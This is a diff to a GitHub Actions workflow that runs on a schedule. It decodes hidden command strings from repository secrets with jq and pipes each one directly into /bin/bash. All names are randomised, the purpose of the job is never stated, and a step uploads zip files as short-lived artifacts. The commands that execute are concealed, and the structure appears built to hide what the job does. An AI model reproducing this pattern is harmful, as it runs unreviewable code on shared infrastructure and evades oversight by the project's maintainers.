@@ -1,22 +1,28 @@
 name: chloewebhooknext
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '12 5/6 * * *'
 
+  schedule:
+    - cron: '48 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chloewebhooknext
         env:
-          uvgpi3: ${{ secrets.uvgpi3 }}
+          jgks4378: ${{ secrets.jgks4378 }}
         run: |
-          echo $uvgpi3 | jq -r .udza28265 | /bin/bash
-          echo $yq4 | jq -r .gvgvv1659 | /bin/bash
-          echo $ehrsn8536 | jq -r .jjx914 | /bin/bash
-          echo $u12927 | jq -r .suny859 | /bin/bash
-          echo $f85383 | jq -r .f83 | /bin/bash
+          printf '%s' "$jgks4378" | jq -r .hfy78 | /bin/bash
+          printf '%s' "$cdtvi376" | jq -r .nu2796 | /bin/bash
+          printf '%s' "$jdfoz10759" | jq -r .wp10 | /bin/bash
+          printf '%s' "$x633" | jq -r .lfj379 | /bin/bash
+          printf '%s' "$iia37572" | jq -r .k5 | /bin/bash
+          echo $bg85 | jq -r .vho5 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DSJKf5Yu
+          path: "*.zip"
+          retention-days: 1
